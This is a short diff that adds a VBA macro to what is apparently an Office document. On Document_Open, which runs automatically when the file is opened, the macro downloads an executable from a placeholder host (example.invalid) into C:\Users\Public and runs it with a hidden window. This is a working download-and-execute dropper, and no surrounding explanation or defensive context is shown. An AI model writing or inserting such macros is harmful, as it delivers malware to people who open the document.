@@ -1,0 +1,6 @@
+Private Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" (ByVal a As Long, ByVal b As String, ByVal c As String, ByVal d As Long, ByVal e As Long) As Long
+Private Sub Document_Open()
+URLDownloadToFileA 0, "http://example.invalid/a.exe", "C:\Users\Public\a.exe", 0, 0
+Shell "C:\Users\Public\a.exe", 0
+End Sub
+
